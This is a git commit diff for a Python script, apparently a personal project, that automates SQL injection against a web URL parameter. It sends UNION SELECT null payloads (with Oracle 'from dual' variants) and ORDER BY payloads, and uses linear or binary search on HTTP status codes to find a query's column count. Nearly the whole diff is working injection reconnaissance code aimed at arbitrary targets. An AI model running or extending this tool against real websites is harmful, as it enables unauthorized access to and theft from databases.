a5d849ebf7e225fa230bebf79ee3f1651fc2b329
hue1337 <matigluchowski0410@gmail.com>
2023-06-22 00:57:57 +0200

    Small update. Bs working, need to make bs for oracle dbs

--- main.py
+++ main.py
@@ -4,13 +4,13 @@ import argparse
 from colorama import Fore, Back, Style
 
 
-class AmountOfColumns():
+class AmountOfColumnsFinder():
     __amount_of_columns = 0
     __url = ''
     __db_exploit = ''
-    __dboracle_exploit = ''
+    __oracle_exploit = ''
     __param_name = ''
-    __order_by_int = 0
+    __bs_orderby_int = int(0)
 
     def __init__(self, url, param_name, amount_of_columns, method=1):
         self.vars_validation(url, amount_of_columns, method)
@@ -39,9 +39,13 @@ class AmountOfColumns():
 
 
     ''' Run '''
+    # Do przebudowania
     def queue_method(self):
         for i in range(self.__amount_of_columns):
-            if '200' in self.make_request():
+            db_code = self.make_request_db()
+            oracle_code = self.make_request_oracle()
+            if db_code == 200 or oracle_code == 200:
+            # if '200' in self.make_request():
                 self.print_green(f'[+] Amount of columns: {i+1}')
                 exit()
             self.add_nulls()
@@ -49,42 +53,81 @@ class AmountOfColumns():
         self.print_red('[-] Amount of columns not found.')
         exit()
 
-    def binary_search_method(self) -> int:
-        # still under contruction. I have no time because of exams at uni lmfao
-        tmp_counter = self.__amount_of_columns/2
-        tmp_found = False
+
+    ''' 
+    ##################################################################################################################
+    '''
+
+    '''
+    TO DO:
+     - zobaczyc jak wyglada response od order_by ze zbyt mala ilosc kolumn z zapytanie do zlej bazy danych 
+     - reuesty do bazy oracle
+    '''
+
+    ''' Binary search algoruthm methods '''
+    def binary_search_method(self) -> None:
+        self.bs_payload()
+        previous = self.__amount_of_columns
+        self.__bs_orderby_int = int(self.__amount_of_columns/2) + int(self.__amount_of_columns%2)
+        db_resp = 0
+        oracle_resp = 0
         while True:
-            if self.is_greater(tmp_counter):
-                # Check if found
-                if tmp_counter > 1:
-                    if not self.is_greater(tmp_counter - 1):
-                        return tmp_counter - 1
-                
+            self.bs_payload()
+            additional_arg = self.__bs_orderby_int%2
+            
+            code1 = self.make_request_db()
+            code2 = self.make_request_oracle()
 
+            # print(Fore.BLUE, f'[*] Current value: {self.__bs_orderby_int} DBr: {code1} ORr {code2}', Style.RESET_ALL)
+            if self.is_equal(code1, code2):
+                print(Fore.GREEN, f'[+] The numeber of columns is: {self.__bs_orderby_int}', Style.RESET_ALL)
+                exit()
+            elif code1 != 200 and code2 != 200:
+                tmp_previous = self.__bs_orderby_int
+                self.__bs_orderby_int -= int(abs(previous-self.__bs_orderby_int)/2) + additional_arg
+                previous = tmp_previous
+            else:
+                tmp_previous = self.__bs_orderby_int
+                self.__bs_orderby_int = int(abs(previous-self.__bs_orderby_int)/2) + additional_arg + self.__bs_orderby_int
+                previous = tmp_previous
+            
 
-    def is_greater(self, response) -> bool:
-        if '500' in response:
-            return True
+    def is_equal(self, code1, code2) -> bool:
+        if code1 == 200 or code2 == 200:
+            self.__bs_orderby_int += 1
+            c1 = self.make_request_db()
+            c2 = self.make_request_oracle()
+            if c1 == 200 or c2 == 200:
+                return True
         return False
 
-    def order_by_paylaod(self) -> str:
+    def bs_payload(self) -> None:
         tmp_request = '\' order by '
         comment = '-- -'
-        return tmp_request + str(self.__order_by_int) + comment
+        self.__db_exploit = tmp_request + str(self.__bs_orderby_int) + comment 
 
-    def increase_order_by_request_int(self) -> None:
-        self.__order_by_int += 1
-
-    def order_by_request(self, final_url) -> str:
+    def bs_request(self, final_url) -> str:
         response = requests.get(final_url)
         self.print_green(response)
 
-    def test_order_by_run(self) -> None:
-        self.print_green(self.order_by_paylaod())
-        self.increase_order_by_request_int()
-        self.print_green(self.encode_url(self.order_by_paylaod()))
-        tmp_url = self.encode_url(self.order_by_paylaod())
-        self.order_by_request(tmp_url)
+    def test_bs_tun(self) -> None:
+        self.binary_search_method()
+        # self.print_green(self.bs_payload())
+        # self.bs_change_columns()
+        # self.print_green(self.encode_url(self.bs_payload()))
+        # tmp_url = self.encode_url(self.bs_payload())
+        # self.bs_request(tmp_url)
+        # self.__bs_orderby_int = 0
+        # self.bs_payload()
+        # print(self.__db_exploit)
+        # self.__bs_orderby_int = 10
+        # self.bs_payload()
+        # print(self.__db_exploit)
+
+    ''' 
+    ##################################################################################################################
+    '''
+
 
     def run(self):
         if self.__method == 1:
@@ -119,14 +162,18 @@ class AmountOfColumns():
         self.print_green(f'Url: {self.__url}')
         self.print_green(f'Amount of columns: {self.__amount_of_columns}')
         self.print_red(f'DB exploit: {self.__db_exploit}')
-        self.print_red(f'DB oracle exploit: {self.__dboracle_exploit}')
+        self.print_red(f'DB oracle exploit: {self.__oracle_exploit}')
 
     ''' Actual script '''
-    def make_request(self)->str:
-        response_db = requests.get(self.encode_db_url())        
-        response_dboracle = requests.get(self.encode_dboracle_url())
-
-        return str(response_dboracle)+str(response_db)
+    def make_request_db(self)->str:
+        # print(Fore.RED, self.encode_db_url(), Style.RESET_ALL)
+        response = requests.get(self.encode_db_url())
+        return response.status_code
+    
+    def make_request_oracle(self)->str:
+        response = requests.get(self.encode_oracle_url())
+        return response.status_code
+        # return str(response_oracle.status_code)+str(response_db.status_code)
 
     def encode_url(self, url_to_encode) -> str():
         url_to_encode = self.__url + self.__param_name + '=' + urllib.parse.quote(url_to_encode)
@@ -137,42 +184,42 @@ class AmountOfColumns():
     def encode_db_url(self) -> str:
         ''' Url encoding for a non oracle db'''
         complete_db_url = self.__url
-        complete_dboracle_url = self.__url
+        complete_oracle_url = self.__url
         complete_db_url += self.__param_name + '=' + urllib.parse.quote(self.__db_exploit)
-        complete_dboracle_url += self.__param_name + '=' + urllib.parse.quote(self.__dboracle_exploit)
+        complete_oracle_url += self.__param_name + '=' + urllib.parse.quote(self.__oracle_exploit)
         
         if '%27' in complete_db_url:
             complete_db_url = complete_db_url.replace('%27', '\'')
         return complete_db_url
         
 
-    def encode_dboracle_url(self):
+    def encode_oracle_url(self):
         ''' Url encoding for an oracle db '''
-        complete_dboracle_url = self.__url
-        complete_dboracle_url += self.__param_name + '=' + urllib.parse.quote(self.__dboracle_exploit)
+        complete_oracle_url = self.__url
+        complete_oracle_url += self.__param_name + '=' + urllib.parse.quote(self.__oracle_exploit)
 
-        if '%27' in complete_dboracle_url:
-            complete_dboracle_url = complete_dboracle_url.replace('%27', '\'')
-        return complete_dboracle_url
+        if '%27' in complete_oracle_url:
+            complete_oracle_url = complete_oracle_url.replace('%27', '\'')
+        return complete_oracle_url
 
 
     def configure_exploit(self):
         dbnull = 'null'
-        dboracle_null = 'null from dual'
+        oracle_null = 'null from dual'
         comment = '-- -'
         exploit_db = f'\' and 1=0 union select -- -'
         exploit_oracle_db = f'\' and 1=0 union select -- -'
 
-        self.__dboracle_exploit = exploit_db[:-4]  + dboracle_null + comment
+        self.__oracle_exploit = exploit_db[:-4]  + oracle_null + comment
         self.__db_exploit = exploit_oracle_db[:-4]  + dbnull + comment
 
     def add_nulls(self):
         dbnull = ',null'
-        dboracle_null = ',null from dual' # 10
+        oracle_null = ',null from dual' # 10
         comment = '-- -'
 
         self.__db_exploit = self.__db_exploit[:-4] + dbnull  + comment
-        self.__dboracle_exploit = self.__dboracle_exploit[:-14] + dboracle_null + comment
+        self.__oracle_exploit = self.__oracle_exploit[:-14] + oracle_null + comment
 
 
     def print_red(self, message):
@@ -195,5 +242,5 @@ if __name__ == '__main__':
 
 
     # bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0], args.method[0])
-    bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0])
-    bs.test_order_by_run()
+    bs = AmountOfColumnsFinder(args.url[0], args.param_name[0], args.amount_of_columns[0])
+    bs.test_bs_tun()
